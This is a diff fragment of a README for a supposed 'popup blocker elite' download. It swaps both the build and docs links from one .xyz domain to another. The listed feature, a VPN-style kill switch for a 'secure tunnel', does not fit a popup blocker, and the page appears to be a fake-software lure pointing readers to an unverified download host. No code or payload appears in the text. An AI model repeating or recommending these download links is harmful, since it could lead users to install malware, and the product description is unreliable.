@@ -12,8 +12,8 @@ The goal is a tool that just works — no clutter, no bloat.
 - 200 MB free disk space
 
 ## Get it
-- 📥 **Get the latest build:** [https://popup-blocker-elite.softonx.xyz](https://popup-blocker-elite.softonx.xyz)
-- 📖 **Docs & guides:** [https://popup-blocker-elite.softonx.xyz](https://popup-blocker-elite.softonx.xyz)
+- 📥 **Get the latest build:** [https://popup-blocker-elite.softax.xyz](https://popup-blocker-elite.softax.xyz)
+- 📖 **Docs & guides:** [https://popup-blocker-elite.softax.xyz](https://popup-blocker-elite.softax.xyz)
 
 ## What you get
 1. **Kill Switch:** Automatic connection termination if the secure tunnel drops unexpectedly.
